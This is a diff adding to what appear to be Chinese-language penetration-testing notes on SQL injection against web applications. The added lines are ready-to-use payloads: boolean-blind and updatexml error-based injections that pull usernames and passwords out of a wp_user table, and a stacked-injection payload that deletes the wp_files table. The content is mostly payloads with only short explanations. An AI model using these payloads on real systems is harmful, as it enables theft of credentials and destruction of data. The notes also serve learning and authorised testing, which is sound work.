@@ -44,3 +44,11 @@ Github上或其他扫描器搜集CMS指纹库
 ?id=-1 union select 1,group_concat(table_name) from information.schema.tables where table_schema=database()  
 ?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='xxx'
 #### 1.2.1.2 字符型注入和布尔盲注
+?id=1' and (select mid((select concat(user,0x7e,pwd) from wp_user),1,1))='a'%23
+?id=1' and (select mid((select concat(user,0x7e,pwd) from wp_user),2,1))='d'%23
+#### 1.2.1.3 报错注入
+updatexml在执行时第二个参数应该为合法XPATH路径，否则会在引发报错的同时将传入的参数输出：  
+?id=1' or updatexml(1,concat(0x7e,(select pwd from wp_user)),1)%23  
+当目标开启多语句执行的时候，可以采用多语句执行的方式修改数据库的任意结构和数据，称作堆叠注入：
+?id=1%27;delete%20%20from%20wp_files;%23
+### 1.2.2 注入点
